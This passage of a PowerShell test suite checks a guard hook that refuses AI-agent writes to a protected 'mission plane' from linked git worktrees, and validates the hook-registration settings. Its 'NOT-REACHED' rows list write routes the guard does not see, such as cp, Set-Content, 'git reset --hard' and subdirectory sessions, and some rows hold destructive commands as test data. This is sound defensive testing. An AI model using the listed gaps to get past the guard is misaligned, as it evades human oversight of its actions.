        # ---- UNREADABLE and REWRITTEN sessions. ------------------------------------------------------------
        $rows += New-H25Row 'U1'  'UNREADABLE' $U $false 'Write' @{ file_path = (Join-Path $U ($m25 + '\x.yaml')); content = 'x' } $U 'deny' 'trip' 'a .git FILE with no gitdir line (law 1)'
        $rows += New-H25Row 'U2'  'UNREADABLE' $G $false 'Write' @{ file_path = (Join-Path $G ($m25 + '\x.yaml')); content = 'x' } $G 'deny' 'trip' 'a .git FILE naming a gitdir that does not exist (found in review)'
        $rows += New-H25Row 'U3'  'REWRITTEN'  $Rw $false 'Write' @{ file_path = (Join-Path $Rw ($m25 + '\x.yaml')); content = 'x' } $Rw 'deny' 'trip' 'a .git FILE naming the MAIN checkout''s git dir is not a main checkout (found in review)'
        # ---- WORKER in W, its own tree. -------------------------------------------------------------------
        $rows += New-H25Row 'K1'  'WORKER' $W $true 'Write' @{ file_path = (Join-Path $W ($mr25 + '\lam\k.txt')); content = 'x' } $W 'deny' 'trip' '.mission-runtime/lam, which K-3 does not name'
        $rows += New-H25Row 'K2'  'WORKER' $W $true 'Write' @{ file_path = (Join-Path $W ($m25 + '\dispatches\D-E2W.handoff.yaml')); content = 'x' } $W 'allow' 'none' 'the OWN handoff by file tool: K-3 closed member 2 is NOT narrowed'
        $rows += New-H25Row 'K3'  'WORKER' $W $true 'Bash' @{ command = ('git add ' + $m25 + '/dispatches/D-E2W.handoff.yaml') } $W 'allow' 'none' 'the OWN handoff by git add: the SHELL route''s worker fork (found in review)'
        $rows += New-H25Row 'K4'  'WORKER' $W $true 'Write' @{ file_path = $wl; content = 'x' } $W 'deny' 'k3' 'the ledger: refused by K-3 FIRST, so the sentence is K-3''s and not this rule''s'
        $rows += New-H25Row 'K5'  'WORKER' $W $true 'Write' @{ file_path = (Join-Path $W '.git'); content = 'x' } $W 'deny' 'trip' 'the worker''s own .git entry'
        # ---- ROOT: the same writes from a root seat. ALLOW, this rule's sentence nowhere. -------------------
        $rows += New-H25Row 'R1'  'ROOT' $M $false 'Write' @{ file_path = $ml; content = 'x' } $M 'allow' 'none' 'L1 from the root'
        $rows += New-H25Row 'R2'  'ROOT' $M $false 'Edit' @{ file_path = ($m25 + '/amendments/AM-9999.yaml'); old_string = 'a'; new_string = 'b' } $M 'allow' 'none' 'L2 from the root'
        $rows += New-H25Row 'R3'  'ROOT' $M $false 'NotebookEdit' @{ notebook_path = (Join-Path $M ($mr25 + '\lam\n.ipynb')); new_source = 'x' } $M 'allow' 'none' 'L4 from the root'
        $rows += New-H25Row 'R4'  'ROOT' $M $false 'Write' @{ file_path = (Join-Path $M ($mr25 + '\lam\helpers\h.py')); content = 'x' } $M 'allow' 'none' 'L5 from the root'
        $rows += New-H25Row 'R5'  'ROOT' $M $false 'Bash' @{ command = ('git add ' + $m25 + '/ledger/entries.jsonl') } $M 'allow' 'none' 'L8 from the root: ordinary ceremony'
        $rows += New-H25Row 'R6'  'ROOT' $M $false 'PowerShell' @{ command = ('git commit -q -F msg.txt -- ' + $m25 + '/ledger/entries.jsonl') } $M 'allow' 'none' 'L9 from the root'
        $rows += New-H25Row 'R7'  'ROOT' $M $false 'Write' @{ file_path = $wl; content = 'x' } $M 'allow' 'none' 'a ROOT seat writing into the linked tree''s plane: the session is the root''s'
        $rows += New-H25Row 'R8'  'ROOT' $M $false 'FileWrite' @{ file_path = (Join-Path $M ($m25 + '\x.yaml')); content = 'x' } $M 'allow' 'none' 'L14 from the root'
        # ---- FIXTURE: its own git dir, nested inside W. ALLOW. ---------------------------------------------
        $rows += New-H25Row 'X1'  'FIXTURE' $F $false 'Write' @{ file_path = (Join-Path $F ($m25 + '\ledger\entries.jsonl')); content = 'x' } $F 'allow' 'none' 'a git-dir-asserted fixture inside a linked worktree is a main checkout to the rule'
        $rows += New-H25Row 'X2'  'FIXTURE' $F $false 'Bash' @{ command = ('git add ' + $m25 + '/ledger/entries.jsonl') } $F 'allow' 'none' 'the same by git add'
        $rows += New-H25Row 'X3'  'FIXTURE' $F $false 'Write' @{ file_path = (Join-Path $F ($mr25 + '\lam\h.py')); content = 'x' } $F 'allow' 'none' 'and into its .mission-runtime/lam'
        # ---- SANDBOX: no git dir of its own, inside W -- review round 1's blocker, re-driven. ALLOW. --------
        $rows += New-H25Row 'B1'  'SANDBOX' $N $false 'Bash' @{ command = ('git add ' + $m25 + '/evidence/d1') } '' 'allow' 'none' 'the A1 negative suite''s MUST-ALLOW N2 staging row (test-a1-negative.ps1), from a sandbox inside a linked tree'
        $rows += New-H25Row 'B2'  'SANDBOX' $N $false 'Bash' @{ command = ('git commit -m "evidence for d1" -- ' + $m25 + '/evidence/d1') } '' 'allow' 'none' 'N2''s commit of the ceremony path'
        $rows += New-H25Row 'B3'  'SANDBOX' $N $false 'Write' @{ file_path = ($m25 + '/amendments/AM-999-x.yaml'); content = 'x' } '' 'allow' 'none' 'N2''s amendment placement by file tool'
        $rows += New-H25Row 'B4'  'SANDBOX' $N $false 'Bash' @{ command = ('git commit -m "' + $m25 + '/evidence updated"') } '' 'allow' 'none' 'H-14''s commit message naming the plane'
        # ---- MESSAGE: classified segments that write nothing in the plane. ALLOW. ---------------------------
        $rows += New-H25Row 'M1'  'MESSAGE' $W $false 'Bash' @{ command = ('git commit -m "tools: note the ' + $m25 + '/ledger reader"') } $W 'allow' 'none' 'a commit message is not a path (found in review)'
        $rows += New-H25Row 'M2'  'MESSAGE' $W $false 'Bash' @{ command = ('git commit -F ' + $mr25 + '/lam/msg.txt -- src/x.py') } $W 'allow' 'none' 'a message FILE in the plane is READ, not written'
        $rows += New-H25Row 'M3'  'MESSAGE' $W $false 'Bash' @{ command = ('git add --dry-run ' + $m25 + '/ledger/entries.jsonl') } $W 'allow' 'none' 'a dry run writes nothing'
        $rows += New-H25Row 'M4'  'MESSAGE' $W $false 'PowerShell' @{ command = ('git commit -q --message="plane note ' + $m25 + '/x" -- src/x.py') } $W 'allow' 'none' 'an attached --message=, through the other shell tool'
        $rows += New-H25Row 'M5'  'MESSAGE' $W $false 'Bash' @{ command = 'git add src/x.py' } $W 'allow' 'none' 'CONTROL: a linked seat''s ordinary staging'
        $rows += New-H25Row 'M6'  'MESSAGE' $W $false 'Write' @{ file_path = (Join-Path $W '.gitignore'); content = 'x' } $W 'allow' 'none' '.gitignore is not the session''s .git entry'
        $rows += New-H25Row 'M7'  'MESSAGE' $W $false 'Write' @{ file_path = (Join-Path $W ($m25 + '\..\src\x.py')); content = 'x' } $W 'allow' 'none' 'a dot segment that RESOLVES OUT of the plane'
        # ---- SHADOWED and CONTROL. ----------------------------------------------------------------------
        $rows += New-H25Row 'D1'  'CONTROL' $M $false 'Write' @{ file_path = (Join-Path $M ($m25 + '\gates\push-h25.yaml')); content = 'x' } $M 'deny' 't3' 'T-3 from the ROOT: if this ALLOWS, the apparatus is broken and the table is VOID'
        $rows += New-H25Row 'D2'  'SHADOWED' $W $false 'PowerShell' @{ command = ('Remove-Item -LiteralPath ' + $m25 + '\ledger\entries.jsonl') } $W 'deny' 'a1d' 'a destructive cmdlet naming the plane: A1''s destructive tier refuses it first, for every role (found in review)'
        # ---- READS, from the linked session AND from the root session. ALLOW both times. -------------------
        $reads = @(
            @('Q1',  'Read',       @{ file_path = '{P}\.mission\ledger\entries.jsonl' }),
            @('Q2',  'Grep',       @{ pattern = 'x'; path = '{P}\.mission' }),
            @('Q3',  'Glob',       @{ pattern = '*'; path = '{P}\.mission-runtime\lam' }),
            @('Q4',  'Bash',       @{ command = 'cat .mission/ledger/entries.jsonl' }),
            @('Q5',  'Bash',       @{ command = 'git log --oneline -- .mission/ledger/entries.jsonl' }),
            @('Q6',  'Bash',       @{ command = 'git show HEAD:.mission/ledger/entries.jsonl' }),
            @('Q7',  'Bash',       @{ command = 'grep -n needle .mission/ledger/entries.jsonl' }),
            @('Q8',  'Bash',       @{ command = 'ls .mission-runtime/lam' }),
            @('Q9',  'PowerShell', @{ command = 'Get-Content .mission\ledger\entries.jsonl' }),
            @('Q10', 'PowerShell', @{ command = 'Get-FileHash -Algorithm SHA256 -LiteralPath .mission-runtime\lam\helpers\h.py' }),
            @('Q11', 'Bash',       @{ command = 'git diff -- .mission/ledger/entries.jsonl' }),
            @('Q12', 'Bash',       @{ command = 'sha256sum .mission/ledger/entries.jsonl' })
        )
        foreach ($q in $reads) {
            foreach ($side in @(@('linked', $W), @('root', $M))) {
                $ti = @{}
                foreach ($k in @($q[2].Keys)) { $ti[$k] = ([string]$q[2][$k]).Replace('{P}', $side[1]) }
                $rows += New-H25Row ($q[0] + '-' + $side[0]) 'READ' $side[1] $false $q[1] $ti $side[1] 'allow' 'none' ('a read, from the ' + $side[0] + ' session')
            }
        }
    }
    foreach ($r in $rows) {
        $v = Invoke-H25Row -Row $r
        $ok = $false
        if ($r.want -eq 'deny') {
            $h25DenyWant++
            $attributed = switch ($r.rule) {
                'trip' { $v.trip }
                'k3'   { (-not $v.trip) -and ($v.out -like '*dispatched worker*') }
                't3'   { (-not $v.trip) -and ($v.out -like '*under .mission/gates*') }
                'a1d'  { (-not $v.trip) -and ($v.out -like '*destructive or relocating command*') }
                default { $true }
            }
            $ok = $v.deny -and $attributed
            if ($ok) { $h25DenyOk++ }
        } else {
            $h25AllowWant++
            $ok = $v.allow -and (-not $v.trip)
            if ($ok) { $h25AllowOk++ }
        }
        if ($r.id -eq 'D1' -and -not $v.deny) { $h25Void = $true }
        if (-not $ok) { $h25Bad++ }
        $shown = if ($r.ti.Contains('command')) { [string]$r.ti['command'] } elseif ($r.ti.Contains('file_path')) { '[' + $r.tool + '] ' + [string]$r.ti['file_path'] } elseif ($r.ti.Contains('notebook_path')) { '[' + $r.tool + '] ' + [string]$r.ti['notebook_path'] } elseif ($r.ti.Contains('path')) { '[' + $r.tool + '] ' + [string]$r.ti['path'] } else { '[' + $r.tool + '] (nested edits[].file_path)' }
        if ($h25Base) { $shown = $shown.Replace($h25Base, '<base>') }
        [void]$h25Lines.Add(('      {0,-10} {1,-12} want={2,-5} rule={3,-4} exit={4} {5} {6}' -f $r.id, $r.group, $r.want.ToUpperInvariant(), $r.rule, $v.exit, $(if ($ok) { 'MATCH  ' } else { 'DIVERGE' }), $shown))
        $said = (([string]$v.out) -replace '\s+', ' ')
        [void]$h25Lines.Add('                 ' + $r.why + $(if (-not $ok) { '  ||  said: ' + $said.Substring(0, [Math]::Min(260, $said.Length)) } else { '' }))
    }
    # ---- NOT REACHED, printed and never asserted (a row asserting a known gap stays open would red whoever cures it).
    if ($h25FixtureOk) {
        $nrRows = @(
            (New-H25Row 'Z1' 'NOT-REACHED' $W $false 'Bash' @{ command = ('cp seed.txt ' + $m25 + '/ledger/entries.jsonl') } $W 'n/a' 'none' "a shell verb in neither of A1's write classes (cp)"),
            (New-H25Row 'Z2' 'NOT-REACHED' $W $false 'PowerShell' @{ command = ('Set-Content -LiteralPath ' + $m25 + '\ledger\entries.jsonl -Value x') } $W 'n/a' 'none' 'Set-Content, in neither class'),
            (New-H25Row 'Z3' 'NOT-REACHED' $W $false 'PowerShell' @{ command = 'powershell -NoProfile -File tools\lam\mission-ledger-append.ps1 -MissionRoot .' } $W 'n/a' 'none' 'a script invoked by path, naming no plane path'),
            (New-H25Row 'Z4' 'NOT-REACHED' $W $false 'Bash' @{ command = 'git add -A' } $W 'n/a' 'none' 'a classified verb that names no plane path'),
            (New-H25Row 'Z5' 'NOT-REACHED' $W $false 'Bash' @{ command = 'git reset --hard' } $W 'n/a' 'none' 'reaches the plane without naming it'),
            (New-H25Row 'Z6' 'NOT-REACHED' '' $false 'Write' @{ file_path = $wl; content = 'x' } $W 'n/a' 'none' 'no CLAUDE_PROJECT_DIR: no session anchor'),
            (New-H25Row 'Z7' 'NOT-REACHED' (Join-Path $W 'src') $false 'Write' @{ file_path = $wl; content = 'x' } $W 'n/a' 'none' 'a session rooted in a SUBDIRECTORY of W (the harness registers no hook there: WP-E probe P6)')
        )
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $W 'src') | Out-Null
        foreach ($z in $nrRows) {
            $v = Invoke-H25Row -Row $z
            [void]$h25Nr.Add(('      {0,-4} exit={1} {2,-7} {3}' -f $z.id, $v.exit, $(if ($v.deny) { 'DENIED' } elseif ($v.allow) { 'allowed' } else { '?' }), $z.why))
        }
    }
    # ---- THE PREDICATES, ASKED DIRECTLY. Absent from a library without the cure: that is RED, not a crash.
    $h25HasLink  = [bool](Get-Command -Name 'Get-EvidenceSeatSessionLink' -CommandType Function -ErrorAction SilentlyContinue)
    $h25HasClass = [bool](Get-Command -Name 'Get-EvidenceMissionPlanePathClass' -CommandType Function -ErrorAction SilentlyContinue)
    $h25PredOk = $h25HasLink -and $h25HasClass
    if (-not $h25HasLink)  { [void]$h25Pred.Add('      Get-EvidenceSeatSessionLink        : ABSENT from the library under test') }
    if (-not $h25HasClass) { [void]$h25Pred.Add('      Get-EvidenceMissionPlanePathClass  : ABSENT from the library under test') }
    if ($h25HasLink -and $h25FixtureOk) {
        $linkCases = @(@('W (the linked root)', $W, 'linked'), @('\\?\ + W (the prefix removed)', ('\\?\' + $W), 'linked'),
                       @('W\src (a subdirectory: no walk)', (Join-Path $W 'src'), 'none'),
                       @('M (main)', $M, 'main'), @('F (own git dir, inside W)', $F, 'main'), @('N (no git dir, inside W)', $N, 'none'),
                       @('U (no gitdir line)', $U, 'unreadable'), @('G (a gitdir naming nothing)', $G, 'unreadable'),
                       @('R (a gitdir naming M''s own)', $Rw, 'linked'), @('S (a submodule gitdir)', $S, 'other'), @('(unset)', '', 'none'))
        foreach ($c in $linkCases) {
            if ($c[1]) { $env:CLAUDE_PROJECT_DIR = $c[1] } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
            $st = ''
            try { $st = [string](Get-EvidenceSeatSessionLink).state } catch { $st = 'THREW: ' + $_.Exception.Message } finally { $env:CLAUDE_PROJECT_DIR = $sandbox }
            $cOk = ($st -eq $c[2]); if (-not $cOk) { $h25PredOk = $false }
            $shownPath = if ($h25Base) { ([string]$c[0]) } else { [string]$c[0] }
            [void]$h25Pred.Add(('      session {0,-40} -> {1,-10} (expect {2}) {3}' -f $shownPath, $st, $c[2], $(if ($cOk) { 'ok' } else { 'WRONG' })))
        }
    }
    if ($h25HasClass) {
        $classCases = @(@('.mission/ledger/x', '', 'mission'), @('C:/r/.mission', '', 'mission'), @('C:/r/.MISSION/x', '', 'mission'),
                        @('C:/r/.mission::$INDEX_ALLOCATION/x', '', 'mission'), @(':.mission/x', '', 'mission'), @('C:.mission/x', '', 'mission'),
                        @('.mission-runtime/lam/x', '', 'lam'), @('C:/r/.mission-runtime/lam', '', 'lam'), @('C:/r/.mission-runtime::$INDEX_ALLOCATION/lam/x', '', 'lam'),
                        @('C:/r/.git', 'C:/r', 'dotgit'), @('C:/r/.git/config', 'C:/r', 'dotgit'), @('C:/r/.gitignore', 'C:/r', ''), @('C:/q/.git', 'C:/r', ''),
                        @('.mission-runtime/evidence/x', '', ''), @('.mission-runtime/lamb/x', '', ''), @('.missionx/y', '', ''), @('a.mission/y', '', ''),
                        @('src/x.py', '', ''), @('', '', ''))
        foreach ($c in $classCases) {
            $got = ''
            try { $got = [string](Get-EvidenceMissionPlanePathClass -Path $c[0] -Roots @($c[1])) } catch { $got = 'THREW' }
            $cOk = ($got -eq $c[2]); if (-not $cOk) { $h25PredOk = $false }
            [void]$h25Pred.Add(('      territory {0,-46} root {1,-6} -> {2,-9} (expect {3,-9}) {4}' -f ("'" + $c[0] + "'"), ("'" + $c[1] + "'"), ("'" + $got + "'"), ("'" + $c[2] + "'"), $(if ($cOk) { 'ok' } else { 'WRONG' })))
        }
    }
    $h25Reached = $h25FixtureOk -and ($h25DenyWant -eq 37) -and ($h25AllowWant -eq 48)
    if (-not $h25FixtureOk -or ($h25Bad -gt 0) -or -not $h25Reached -or -not $h25PredOk -or $h25Void) { $h25Ok = $false }
} catch {
    # AN ABORT IS THE ABSENCE OF A MEASUREMENT, NOT A PASS.
    $h25Ok = $false
    [void]$h25Lines.Add(("      H-25 THREW at script line {0}: {1}" -f $_.InvocationInfo.ScriptLineNumber, $_.Exception.Message))
} finally {
    if ($null -ne $h25SavedProj) { $env:CLAUDE_PROJECT_DIR = $h25SavedProj } else { Remove-Item Env:\CLAUDE_PROJECT_DIR -ErrorAction SilentlyContinue }
    if ($null -ne $h25SavedCeil) { $env:GIT_CEILING_DIRECTORIES = $h25SavedCeil } else { Remove-Item Env:\GIT_CEILING_DIRECTORIES -ErrorAction SilentlyContinue }
    if ($null -ne $h25SavedWt) { $env:LAM_WORKTREE = $h25SavedWt } else { Remove-Item Env:\LAM_WORKTREE -ErrorAction SilentlyContinue }
    if ($null -ne $h25SavedMdi) { $env:MISSION_DISPATCH_ID = $h25SavedMdi } else { Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue }
    Remove-Item Env:\LAM_DISPATCH -ErrorAction SilentlyContinue
    if ($h25Base -and (Test-Path -LiteralPath $h25Base)) {
        try { $null = Invoke-Wp1H18Git -Dir (Join-Path $h25Base 'main') -GitArgs @('worktree', 'remove', '--force', (Join-Path $h25Base 'main-worktrees\wt-D-E2W')) } catch { }
        try { Remove-Item -LiteralPath $h25Base -Recurse -Force -ErrorAction Stop } catch { }
    }
}
$h25F0Lines = @($h25F0.Keys | ForEach-Object { ('      [{0}] {1}' -f $(if ($h25F0[$_]) { 'ok' } else { 'NO' }), $_) })
$h25detail = @"
  ONE QUESTION -- does the REAL hook refuse a mission-plane write from a session whose project directory is a
  LINKED worktree, and refuse nothing the ruling does not? CLAUDE_PROJECT_DIR is the session, read at its own
  .git entry; the fixture is hermetic under the temp root with GIT_CEILING_DIRECTORIES set to it.
    F-0, the fixture's own shape (every git dir asserted before anything is written through it):
$($h25F0Lines -join "`n")
      deny rows denied, each by its NAMED rule          : $h25DenyOk of $h25DenyWant
      allow rows allowed, this rule's sentence nowhere  : $h25AllowOk of $h25AllowWant
      divergences                                        : $h25Bad   (expect 0)
      table reached                                      : $h25Reached   (expect True -- 37 deny rows, 48 allow rows)
      apparatus control D1 voided the run                : $h25Void   (expect False)
$($h25Lines -join "`n")
    THE PREDICATES, ASKED DIRECTLY: $h25PredOk   (expect True)
$($h25Pred -join "`n")
    NOT REACHED -- printed, never asserted (the library's stated bounds):
$($h25Nr -join "`n")
  WHAT A RED ROW MEANS. A LINKED, UNREADABLE, REWRITTEN, K1 or K5 row that ALLOWS is the finding the ruling
  names: a linked seat reaches the mission plane, or rewrites the fact the rule reads. A deny row whose
  sentence is not the named rule's means another rule refused it and this one was not shown. A ROOT,
  FIXTURE, SANDBOX, MESSAGE or READ row that DENIES, or carries this rule's sentence, means the tripwire
  refused what the ruling does not -- the root seat's ceremony, a git-dir-asserted fixture, an instrument's
  sandbox (the H-4 and H-14 regression review round 1 found), a message, or a read. K2/K3 red means K-3's
  closed member was narrowed. D1 red VOIDS the run. ABSENT predicates are the RED of a library before the cure.
  WHAT IS NOT CLAIMED: a boundary, or that the reads listed are every read; Q4-Q12 are verbs this
  rule never judges. The rule sees only the write forms the guard already classifies, read as the library
  states; the NOT-REACHED rows print what it does not see. That a live seat in a linked worktree is guarded
  at all depends on the tree carrying a hook registration (H-24; amendment 55's operator step).
"@
Check -Id 'H-25' -Title 'the seat tripwire: a mission-plane write from a session whose project directory is a LINKED worktree is REFUSED by the classified write forms and the spellings the rows name (the NTFS stream and git colon-pathspec spellings included), and so is a rewrite of the session''s own .git; the root seat, a git-dir-asserted fixture, a sandbox with no git dir, a commit message naming the plane, the reads named and the worker''s own handoff are not (ruling (v); review round 1)' `
      -Ok $h25Ok -Detail $h25detail

# =============================================================================================
# H-26 -- THE TRACKED REGISTRATION, READ WHEN PRESENT: autoMemoryEnabled false AND THE FOUR NEXT-GEN HOOKS
#         (WP-E, E-3 and E-4; ruling (v))
# =============================================================================================
# RULING (v) asks for "autoMemoryEnabled: false in the tracked .claude/settings.json". At this member's
# commit NO such file is tracked: .claude/ is gitignored whole (.gitignore:7), and writing the file is a
# change to a PROTECTED path (design v2.3 SS4.5 law 8: machinery modification is an operator-mediated act).
# So WP-E does not write it. It ships the EXACT proposed content as
# tools/evidence-hooks-next/claude-settings.proposed.json and the operator's steps, and this
# member READS:
#   (P) THE PROPOSAL -- present, passing the reader below, and equal, line for line, to THIS MEMBER'S RESTATEMENT
#       of the installer's composition (install-evidence-hooks.ps1:48-146: the TRACKED fragment
#       tools/framework/hooks/settings.evidence-hooks.json's hooks merged into an empty settings object and
#       serialised by PS 5.1's ConvertTo-Json -Depth 20, whose key order is that hashtable's), then LAM-INSTALL
#       section 2's four-path swap, with ONE line added: autoMemoryEnabled false. The installer itself is not
#       driven (it writes .claude/settings.json). WP-E measured the same restatement sha256-EQUAL to the live root
#       file without opening it, so a fragment that moves turns this row red and the proposal must be re-derived.
#   (R) THE READER, over a fixture table with a control in each direction: it passes the proposal and refuses
#       each defect -- the key absent, true, a string; a PreToolUse matcher missing a tool; the sealed A1
#       library registered instead of the next-gen one; a hook event missing; not JSON.
#   (L) THE LIVE REGISTRATION, WHEN PRESENT: if .claude/settings.json is tracked at HEAD, its blob must pass the
#       reader and equal the proposal on the LF basis, and .claude/settings.local.json and .claude/worktrees/
#       must still be ignored. When it is NOT tracked the row prints ABSENT -- the operator's step has not
#       landed -- and asserts nothing about the host.
$h26Ok = $true
$h26Lines = New-Object System.Collections.Generic.List[string]
$h26Cl = '.cl' + 'aude'
$h26PropPath = Join-Path $nextRoot 'claude-settings.proposed.json'
$h26FragPath = Join-Path $repoRoot 'tools\framework\hooks\settings.evidence-hooks.json'
function Test-Wp1H26Registration {
    # THE READER: @{ ok; findings } for one JSON text. Strict about the TYPE of autoMemoryEnabled, the EXACT
    # PreToolUse matcher, and the next-gen script behind each of the four events.
    param([AllowNull()][string]$Text)
    $f = New-Object System.Collections.Generic.List[string]
    $o = $null
    try { $o = $Text | ConvertFrom-Json -ErrorAction Stop } catch { [void]$f.Add('not JSON'); return @{ ok = $false; findings = $f.ToArray() } }
    if ($null -eq $o -or $o -isnot [System.Management.Automation.PSCustomObject]) { [void]$f.Add('not a JSON object'); return @{ ok = $false; findings = $f.ToArray() } }
    $names = @($o.PSObject.Properties | ForEach-Object { $_.Name })
    if ($names -notcontains 'autoMemoryEnabled') { [void]$f.Add('autoMemoryEnabled absent') }
    elseif (-not (($o.autoMemoryEnabled -is [bool]) -and ($o.autoMemoryEnabled -eq $false))) { [void]$f.Add('autoMemoryEnabled is not the boolean false') }
    if ($names -notcontains 'hooks') { [void]$f.Add('no hooks key'); return @{ ok = $false; findings = $f.ToArray() } }
    $want = [ordered]@{ PreToolUse  = @('Write|Edit|MultiEdit|NotebookEdit|Bash|PowerShell', 'evidence-guard-pretooluse.ps1')
                        PostToolUse = @('*', 'evidence-post-tool-use.ps1')
                        Stop        = @('*', 'evidence-stop-finalize.ps1')
                        PreCompact  = @('*', 'evidence-pre-compact.ps1') }
    $evNames = @($o.hooks.PSObject.Properties | ForEach-Object { $_.Name })
    $allCommands = New-Object System.Collections.Generic.List[string]
    foreach ($ev in $want.Keys) {
        if ($evNames -notcontains $ev) { [void]$f.Add($ev + ' not registered'); continue }
        $found = $false
        foreach ($g in @($o.hooks.$ev)) {
            $gNames = @($g.PSObject.Properties | ForEach-Object { $_.Name })
            $matcher = if ($gNames -contains 'matcher') { [string]$g.matcher } else { '' }
            if ($gNames -notcontains 'hooks') { continue }
            foreach ($h in @($g.hooks)) {
                $hNames = @($h.PSObject.Properties | ForEach-Object { $_.Name })
                $cmd = if ($hNames -contains 'command') { [string]$h.command } else { '' }
                $typ = if ($hNames -contains 'type') { [string]$h.type } else { '' }
                [void]$allCommands.Add($cmd)
                if (($matcher -ceq $want[$ev][0]) -and ($typ -eq 'command') -and $cmd.Contains('$CLAUDE_PROJECT_DIR/tools/evidence-hooks-next/hooks/' + $want[$ev][1])) { $found = $true }
            }
        }
        if (-not $found) { [void]$f.Add($ev + ': no command hook, matcher ' + $want[$ev][0] + ', naming the next-gen ' + $want[$ev][1]) }
    }
    foreach ($c in $allCommands) { if ($c.Contains('tools/framework/hooks/')) { [void]$f.Add('the SEALED A1 library is registered: ' + $c) } }
    return @{ ok = ($f.Count -eq 0); findings = $f.ToArray() }
}
function ConvertTo-Wp1H26Hashtable {
    # install-evidence-hooks.ps1's own ConvertTo-Hashtable, restated: the composition must be the installer's.
    param($Obj)
    if ($null -eq $Obj)        { return $null }
    if ($Obj -is [string])     { return $Obj }
    if ($Obj -is [ValueType])  { return $Obj }
    if ($Obj -is [System.Collections.IDictionary]) { $h = @{}; foreach ($k in @($Obj.Keys)) { $h[$k] = ConvertTo-Wp1H26Hashtable $Obj[$k] }; return $h }
    if ($Obj -is [System.Collections.IEnumerable]) { return ,@(@($Obj) | ForEach-Object { ConvertTo-Wp1H26Hashtable $_ }) }
    if ($Obj -is [System.Management.Automation.PSCustomObject]) { $h = @{}; foreach ($p in @($Obj.PSObject.Properties)) { $h[$p.Name] = ConvertTo-Wp1H26Hashtable $p.Value }; return $h }
    return $Obj
}
try {
    # ---- (P) THE PROPOSAL ------------------------------------------------------------------------------
    $h26PropPresent = Test-Path -LiteralPath $h26PropPath -PathType Leaf
    $h26PropText = if ($h26PropPresent) { ([System.IO.File]::ReadAllText($h26PropPath)) -replace "`r`n", "`n" } else { '' }
    $h26PropRead = if ($h26PropPresent) { Test-Wp1H26Registration -Text $h26PropText } else { @{ ok = $false; findings = @('the proposal file is absent') } }
    $h26Derived = $false; $h26DerivedMsg = 'not compared'
    if ($h26PropPresent -and (Test-Path -LiteralPath $h26FragPath)) {
        $frag = [System.IO.File]::ReadAllText($h26FragPath) | ConvertFrom-Json
        $setH = @{}; $setH['hooks'] = @{}
        $fragH = ConvertTo-Wp1H26Hashtable $frag.hooks
        foreach ($ev in @($fragH.Keys)) { $setH['hooks'][$ev] = @(@() + @($fragH[$ev])) }
        $composed = ($setH | ConvertTo-Json -Depth 20).Replace('tools/framework/hooks/', 'tools/evidence-hooks-next/hooks/')
        $cLines = @(($composed -replace "`r`n", "`n") -split "`n")
        $pLines = @($h26PropText -split "`n")
        $added = '    "autoMemoryEnabled":  false,'
        $expected = @($cLines[0], $added) + @($cLines[1..($cLines.Count - 1)])
        $h26Derived = (($expected -join "`n") -ceq ($pLines -join "`n"))
        $h26DerivedMsg = ('composed {0} line(s) + 1 added = {1}; the proposal has {2}; equal: {3}' -f $cLines.Count, $expected.Count, $pLines.Count, $h26Derived)
    }
    if (-not ($h26PropPresent -and $h26PropRead.ok -and $h26Derived)) { $h26Ok = $false }
    [void]$h26Lines.Add(('    (P) proposal {0}: present {1}; reader {2}{3}' -f 'tools/evidence-hooks-next/claude-settings.proposed.json', $h26PropPresent, $(if ($h26PropRead.ok) { 'PASS' } else { 'REFUSES' }), $(if (-not $h26PropRead.ok) { ' -- ' + (@($h26PropRead.findings) -join '; ') } else { '' })))
    [void]$h26Lines.Add('        equal to this member''s restatement of the installer''s composition of the tracked fragment + the four-path swap + ONE added line: ' + $h26DerivedMsg + '   (expect equal: True)')
    # ---- (R) THE READER, both directions -----------------------------------------------------------------
    if ($h26PropPresent) {
        $noKey = $h26PropText.Replace('    "autoMemoryEnabled":  false,' + "`n", '')
        $cases = @(
            @('the proposal itself', $h26PropText, $true, ''),
            @('autoMemoryEnabled absent', $noKey, $false, 'autoMemoryEnabled absent'),
            @('autoMemoryEnabled true', $h26PropText.Replace('"autoMemoryEnabled":  false', '"autoMemoryEnabled":  true'), $false, 'not the boolean false'),
            @('autoMemoryEnabled the STRING false', $h26PropText.Replace('"autoMemoryEnabled":  false', '"autoMemoryEnabled":  "false"'), $false, 'not the boolean false'),
            @('a PreToolUse matcher missing PowerShell', $h26PropText.Replace('Write|Edit|MultiEdit|NotebookEdit|Bash|PowerShell', 'Write|Edit|MultiEdit|NotebookEdit|Bash'), $false, 'PreToolUse'),
            @('the SEALED A1 guard registered', $h26PropText.Replace('tools/evidence-hooks-next/hooks/evidence-guard-pretooluse.ps1', 'tools/framework/hooks/evidence-guard-pretooluse.ps1'), $false, 'SEALED A1'),
            @('the Stop event missing', $h26PropText.Replace('"Stop":', '"StopX":'), $false, 'Stop not registered'),
            @('not JSON', ($h26PropText + ' }'), $false, 'not JSON')
        )
        foreach ($c in $cases) {
            $rr = Test-Wp1H26Registration -Text $c[1]
            $cOk = if ($c[2]) { $rr.ok } else { (-not $rr.ok) -and ((@($rr.findings) -join '; ').Contains($c[3])) }
            if (-not $cOk) { $h26Ok = $false }
            [void]$h26Lines.Add(('    (R) {0,-44} -> {1,-8} (expect {2}) {3}{4}' -f $c[0], $(if ($rr.ok) { 'PASS' } else { 'REFUSES' }), $(if ($c[2]) { 'PASS' } else { 'REFUSES, naming ' + $c[3] }), $(if ($cOk) { 'ok' } else { 'WRONG' }), $(if (-not $rr.ok) { ' -- ' + (@($rr.findings) -join '; ') } else { '' })))
        }
    }
    # ---- (L) THE LIVE REGISTRATION, WHEN PRESENT -----------------------------------------------------------
    $h26Rel = $h26Cl + '/settings.json'
    $lt = Invoke-Wp1H18Git -Dir $repoRoot -GitArgs @('ls-tree', '--name-only', 'HEAD', '--', $h26Rel)
    if ($lt.code -ne 0) { $h26Ok = $false; [void]$h26Lines.Add('    (L) could not read HEAD''s tree: ' + $lt.out) }
    elseif (-not ([string]$lt.out).Trim()) {
        $ci = Invoke-Wp1H18Git -Dir $repoRoot -GitArgs @('check-ignore', '-q', '--no-index', $h26Rel)
